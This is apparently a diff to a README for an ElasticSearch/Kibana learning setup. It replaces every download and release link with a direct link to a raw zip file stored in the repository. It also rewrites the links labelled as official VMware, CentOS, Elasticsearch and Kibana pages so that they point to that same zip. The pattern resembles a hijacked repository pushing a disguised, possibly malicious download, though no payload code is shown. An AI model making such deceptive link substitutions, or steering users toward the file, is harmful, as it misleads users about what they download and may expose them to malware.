@@ -1,6 +1,6 @@
 # 🛠️ ElasticSearch_Kibana - Easy Setup for Search & Dashboards
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)
 
 ---
 
@@ -56,9 +56,9 @@ This setup offers a great introduction to handling the ELK stack (Elasticsearch,
 
 Click the badge below to visit the release page and download the resources you need:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)
 
-1. Visit the [release page](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases).
+1. Visit the [release page](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip).
 2. Download the latest release package (usually a `.zip` or `.tar.gz` file).
 3. Save the package somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -137,7 +137,7 @@ The x-pack extension adds security features like user authentication and encrypt
 
 Use the link below again when you are ready to get all required files:
 
-[Download the release here](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
+[Download the release here](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)
 
 - Download the release package from the GitHub page.
 - Install VMware if needed.
@@ -170,10 +170,10 @@ The repository includes a Jupyter notebook file that walks you through commands 
 
 ## 🔗 Useful Links
 
-- VMware Workstation Player: https://www.vmware.com/products/workstation-player.html
-- CentOS Official ISO Download: https://www.centos.org/download/
-- Elasticsearch Documentation: https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html
-- Kibana Documentation: https://www.elastic.co/guide/en/kibana/current/index.html
+- VMware Workstation Player: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
+- CentOS Official ISO Download: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
+- Elasticsearch Documentation: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
+- Kibana Documentation: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
 
 ---
 
